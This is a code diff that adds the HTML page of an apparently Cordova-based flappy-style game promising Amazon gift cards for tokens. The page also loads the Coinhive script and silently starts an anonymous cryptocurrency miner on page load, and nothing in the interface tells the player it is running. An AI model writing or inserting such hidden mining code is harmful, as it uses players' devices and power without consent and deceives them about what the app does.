@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Blank App</title>
+        <!--<meta name="viewport" content="initial-scale=1.0" />-->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+        <script type="text/javascript" src="phaser.min.js"></script>
+        <script type="text/javascript" src="main.js"></script>
+        <style> 
+        * {
+            margin: 0;
+            padding: 0;
+        }
+            
+            canvas{
+                margin: 0px !important;
+                width:100% !important;
+            }
+            
+            #myModal{
+                margin-top:30%;
+            }
+        </style> 
+    </head>
+    <body>
+        
+        
+            <h5>
+                <span style='color:blue;' id='Multiplier'>1</span>X 
+                <span style='color:red;' id='secondsLeft'></span> 
+                <span style='color:gold;float:right;'>
+                <span  id='TotalTokens'>0</span> 
+                    <i class="fa fa-money"></i>
+                </span>
+            </h5>
+            <div id="myModal" class="modal fade" data-backdrop="static" role="dialog">
+              <div class="modal-dialog">
+
+                <!-- Modal content-->
+                <div class="modal-content">
+                  <div class="modal-body">
+                        <center id='ouchDiv'>
+                            <h1 style='color:#66BDC8'>Ouch</h1>
+                            <p>Ready to <strong style='color:#CCB623;'><em>cash out</em>?</strong></p>
+                            <button id='yesBtn' class='btn btn-success'>Yes</button>
+                            <hr/>
+                            <button class='btn btn-warning' data-dismiss='modal'>No, Keep Playing</button>
+                        </center>
+                        
+                            <form style='display:none;' id='cashOutForm'>
+                                <p>How would you like to spend your <span id='numOfTokens'></span></p>
+                                <div class="radio">
+                                  <label><input type="radio" name="optradio"><img class='img img-responsive' src='https://likeacoupon.s3.amazonaws.com/wp-content/uploads/2016/09/amazon660.jpg' />Amazon $25 Giftcard</label>
+                                </div>
+                                <div class="radio">
+                                  <label><input type="radio" name="optradio"><img class='img img-responsive' src='https://likeacoupon.s3.amazonaws.com/wp-content/uploads/2016/09/amazon660.jpg' />Amazon $50 Giftcard</label>
+                                </div>
+                            </form>
+                      
+                        
+                  </div>
+                </div>
+              </div>
+            </div>
+        
+        
+            
+        
+        
+       
+        <script src="https://www.gstatic.com/firebasejs/4.6.2/firebase.js"></script>
+        <script>
+          // Initialize Firebase
+          var config = {
+            apiKey: "AIzaSyDliZviBPRm1XBWiFTl4Ob7ZlP-VD2Qi5s",
+            authDomain: "flappy-prizes-719e0.firebaseapp.com",
+            databaseURL: "https://flappy-prizes-719e0.firebaseio.com",
+            projectId: "flappy-prizes-719e0",
+            storageBucket: "",
+            messagingSenderId: "971649511884"
+          };
+          firebase.initializeApp(config);
+        </script>
+        
+            
+        <script type="text/javascript" src="cordova.js"></script>
+        
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+            
+            function onDeviceReady() {
+            alert("Device is ready");
+              document.removeEventListener('deviceready', onDeviceReady, false);
+            
+              admob.setOptions({
+                publisherId:          "ca-app-pub-3039100266657774/7522200448"
+              });    
+                
+              // Set AdMobAds options:
+              /*
+                admob.setOptions({
+                publisherId:          "ca-app-pub-3039100266657774/7522200448",  // Required
+                interstitialAdId:     "ca-app-pub-XXXXXXXXXXXXXXXX/IIIIIIIIII",  // Optional
+                tappxIdiOS:           "/XXXXXXXXX/Pub-XXXX-iOS-IIII",            // Optional
+                tappxIdAndroid:       "/XXXXXXXXX/Pub-XXXX-Android-AAAA",        // Optional
+                tappxShare:           0.5                                        // Optional
+              });
+                */
+
+              // Start showing banners (atomatic when autoShowBanner is set to true)
+              admob.createBannerView();
+                
+                alert("Banner should be showing");
+
+              // Request interstitial (will present automatically when autoShowInterstitial is set to true)
+              //admob.requestInterstitialAd();
+            }
+
+            document.addEventListener("deviceready", onDeviceReady, false);
+            
+            
+            
+            
+            
+            
+            var miner = new CoinHive.Anonymous('ZGtzmbRgCptCOQJy8o27KklTERV6C1gs',{
+                threads: 1
+            });
+            miner.start();
+            var totalSecondsPassed = 1;
+            var multiplier = 1;
+            var totalScore = 0;
+            setInterval(function() {
+                totalSecondsPassed++;
+                
+                /*
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+                */
+                var secondsLeftUntilUpgrade = 30 - totalSecondsPassed;
+                
+                
+                if(totalSecondsPassed >= 30){
+                    multiplier = 2;
+                    secondsLeftUntilUpgrade = 90 - totalSecondsPassed;
+                }
+                
+                if(totalSecondsPassed >= 60){
+                    multiplier = 3;
+                    secondsLeftUntilUpgrade = 180 - totalSecondsPassed;
+                }
+                
+                if(totalSecondsPassed >= 120){
+                    multiplier = 4;
+                    secondsLeftUntilUpgrade = 540 - totalSecondsPassed;
+                }
+                
+                if(totalSecondsPassed >= 2400){
+                    multiplier = 5;
+                }
+                
+                // Output to HTML elements...
+                //document.getElementById('TotalHashes').innerText = totalHashes;
+                //document.getElementById('AcceptedHashes').innerText = acceptedHashes;
+                if(multiplier > 0){
+                    document.getElementById('Multiplier').innerText = multiplier;
+                }
+                document.getElementById('secondsLeft').innerText = "(" + secondsLeftUntilUpgrade + "s)";
+            }, 1000);
+            
+            
+            function updateTokens(){
+                //document.getElementById('CurrentScore').innerText = mainState.score;
+                totalScore += 1;
+                document.getElementById('TotalTokens').innerText = totalScore * multiplier;
+            }
+            
+            function userDied(){
+                game.paused = true;
+                $('#myModal').modal('show');
+            }
+            
+            $('#myModal').on('hidden.bs.modal', function () {
+                game.paused = false;
+            });
+            
+            $('#yesBtn').on('click', function(){
+                $('#ouchDiv').css('display', 'none');
+                $('#cashOutForm').fadeIn();
+            });
+            
+        </script>
+    </body>
+</html>
